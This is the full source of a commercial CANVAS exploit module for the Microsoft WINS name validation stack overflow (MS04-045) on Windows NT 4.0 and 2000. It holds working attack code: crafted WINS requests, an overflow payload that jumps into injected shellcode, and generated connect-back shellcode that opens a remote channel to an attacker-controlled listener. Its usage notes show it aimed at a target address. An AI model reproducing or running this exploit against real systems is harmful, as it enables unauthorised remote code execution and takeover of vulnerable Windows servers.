#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef

# GUI info
NAME='WINS Name Validation Overflow'
DESCRIPTION='WINS Name Validation Stack Overflow'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='12/14/04'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/Bulletin/MS04-045.mspx'
DOCUMENTATION['Repeatability']='One shot'
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION["CVE Name"] = "CVE-2004-0567"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0567"
DOCUMENTATION['CVSS'] = 7.5

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['NT','2000']
PROPERTY['MSADV']='MS04-045'

GTK2_DIALOG="dialog.glade2"

NAME=DESCRIPTION

NOTES="""
Since the context address we send is stored in memory in a structure
of which the address is sent back to us, we can put opcodes such as
pop eax&jmp esp and get our return addresses to point to it.
This will make the exploit independant of service packs and localization.

Tested on:
Windows NT 4.0 Server SP6a French OOTB
Windows 2000 Server SP0 English OOTB
Windows 2000 Server SP1 English OOTB
Windows 2000 Server SP2 English OOTB
Windows 2000 Server SP3 English OOTB
Windows 2000 Server SP4 English OOTB

Usage:
./commandlineInterface.py -v 1 -p 5555
./exploits/ms04_045/ms04_045.py -v 1 -t 10.10.11.22 -l 10.10.11.1 -d 5555
"""

CHANGELOG="""
"""

import canvasengine
runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit

targets = {
    0:['Autodetect (N/A)'],
    1:['Windows NT 4.0 SP6a and 2000 SP0-SP4'],
}

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.name=NAME
        self.host=''
        self.port=42
        self.badstring='\x00'
        self.searchcode=''
        return

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
        import shellcodeGenerator
        port=self.callback.port
        host=self.callback.ip
        sc=shellcodeGenerator.win32()
        sc.addAttr('tcpconnect',{'port':port,'ipaddress':host})
        sc.addAttr('SmallRecvExecWin32',{'socketreg':'FDSPOT'}) #MOSDEF
        sc.addAttr('UseWS2Ordinal',None)
        self.shellcode=sc.get()
        return self.shellcode

    def getargs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))
        return 
    
    def run(self):
        self.getargs()

        self.setInfo('%s attacking %s:%d - (in progress)'%(NAME,self.host,self.port))
        self.log('%s attacking %s:%d - (in progress)'%(NAME,self.host,self.port))
        if self.version==0:
            self.version=1
        self.info=targets[self.version]

        request=''
        request+=struct.pack('>LLLLLHHL',0x29,0x7800,0,0,0xe4ff58,1,1,0)
        request+='A'*(0x2d-len(request))
        s=self.gettcpsock()
        try:
            s.connect((self.host,self.port))
        except:
            self.log('Could not connect to port %s:%s'%(self.host,self.port))
            return 0
        self.log('Connected to target')
        self.websend(s,request)
        response=self.webrecv(s)
        msgtype,context,version=struct.unpack('>LLL',response[12:24])
        if msgtype!=1:
            self.log('WINS association request rejected')
            return 0
        payload=''
        if len(self.shellcode)>0x100:
            raise Exception,'Shellcode too big!'
        payload+=self.shellcode
        payload+='A'*(0x100-len(payload))
        payload+='B'*(0x134-len(payload)) #overwritten data
        payload+=struct.pack('<L',context+0x34)
        payload+='C'*4
        payload+=struct.pack('<L',context+0x34)
        payload+='A'*8
        from MOSDEF import mosdef
        payload+=mosdef.assemble('jmp $-%d'%(len(payload)+5),'x86')
        request=''
        request+=struct.pack('>LLLLLL',len(payload)+0x14,0x7800,context,3,6,len(payload))
        request+=payload
        self.websend(s,request)

        time.sleep(2)
        if self.ISucceeded():
            return 1
        s.close()

        return 0

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i+=1

    def usage(self):
        print 'Usage: %s -v version -t host -p port -l localip -d localport\n'%(sys.argv[0])
        self.displayVersions()

if __name__=='__main__':
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
